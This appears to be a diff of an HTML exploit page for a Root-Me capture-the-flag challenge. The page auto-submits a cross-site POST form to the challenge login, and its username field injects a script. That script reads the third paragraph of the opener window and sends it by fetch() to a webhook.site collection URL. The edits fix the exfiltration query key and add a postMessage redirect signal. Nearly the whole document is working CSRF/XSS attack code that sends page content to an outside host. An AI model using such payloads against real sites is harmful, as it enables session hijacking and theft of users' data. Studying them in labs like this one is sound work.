@@ -5,17 +5,20 @@
     <title>Second window</title>
 </head>
 <body>
+
 <h1>CSRF</h1>
 <form method="POST" action="http://challenge01.root-me.org:58003/login">
-  <input type="text" name="username" value="<script>fetch('https://webhook.site/0a33c9c6-2caf-4140-9d00-a651080fe455?g6g'+window.opener.document.querySelectorAll('section > p')[2].innerHTML)</script>">
-  <input type="text" name="secret" value="redacted">
+  <input type="text" name="username" value="<script>fetch('https://webhook.site/0a33c9c6-2caf-4140-9d00-a651080fe455?g6g='+window.opener.document.querySelectorAll('section > p')[2].innerHTML)</script>">
+  <input type="text" name="secret" value="FAILED">
   <input type="submit">
 </form>
-<script>
-  window.opener.postMessage({}, "*")
-  document.querySelector("form").submit()
-</script>
 
+<script>
+
+    window.opener.postMessage({redirect: "go"}, "*");
+    document.querySelector("form").submit();
+
+</script>
 
 </body>
 </html>
